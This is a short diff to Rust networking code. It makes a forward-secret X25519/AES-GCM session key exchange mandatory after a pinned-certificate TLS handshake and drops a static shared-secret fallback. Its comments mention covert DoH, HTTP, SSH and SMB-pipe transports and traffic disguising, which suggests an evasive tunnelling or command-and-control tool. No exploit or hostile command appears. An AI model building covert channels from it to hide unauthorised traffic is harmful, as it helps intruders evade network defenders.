@@ -30,17 +30,8 @@
 use anyhow::{anyhow, Result};
 use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
-// CryptoSession is used by the TLS fallback path (when forward-secrecy is off)
-// and by the DoH/HTTP covert transports.  When forward-secrecy is on AND no
-// covert transport feature is compiled in, the import is unused, so guard it.
-#[cfg(any(
-    not(feature = "forward-secrecy"),
-    feature = "doh-transport",
-    feature = "http-transport",
-    feature = "ssh-transport",
-    feature = "smb-pipe-transport"
-))]
 use common::CryptoSession;
+use common::forward_secrecy;
 use common::{Message, Transport};
 use log::{error, info, warn};
 use rustls::ClientConfig;
@@ -336,15 +327,15 @@ pub async fn build_outbound_transport(
     let mut tls_stream = connector.connect(server_name, tcp).await?;
     info!("outbound-c: TLS handshake complete");
 
-    #[cfg(feature = "forward-secrecy")]
-    let session = common::forward_secrecy::negotiate_session_key(
+    // X25519 ECDH is now mandatory — each session derives a unique
+    // AES-256-GCM key from an ephemeral Diffie–Hellman exchange
+    // authenticated by the PSK, providing forward secrecy.
+    let session = forward_secrecy::negotiate_session_key(
         &mut tls_stream,
         secret.as_bytes(),
         true, // client sends its public key first
     )
     .await?;
-    #[cfg(not(feature = "forward-secrecy"))]
-    let session = CryptoSession::from_shared_secret(secret.as_bytes());
 
     // Wire traffic normalization profile from config (M-39 / Prompt 4-1).
     // When `traffic_profile = "tls"` the raw ciphertext is additionally wrapped
